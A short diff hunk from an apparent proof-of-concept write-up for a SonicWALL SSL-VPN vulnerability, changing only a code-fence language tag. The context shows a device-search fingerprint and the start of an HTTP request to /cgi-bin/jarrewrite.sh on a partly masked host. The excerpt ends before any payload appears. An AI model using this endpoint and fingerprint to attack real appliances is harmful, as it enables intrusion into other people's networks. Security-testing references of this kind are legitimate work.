@@ -8,7 +8,7 @@ server=="SonicWALL SSL-VPN Web Server"
 ```
 
 ## POC
-``` java
+``` javascript
 GET /cgi-bin/jarrewrite.sh HTTP/1.1
 Host: 103.x.x.x:4433
 Connection: close
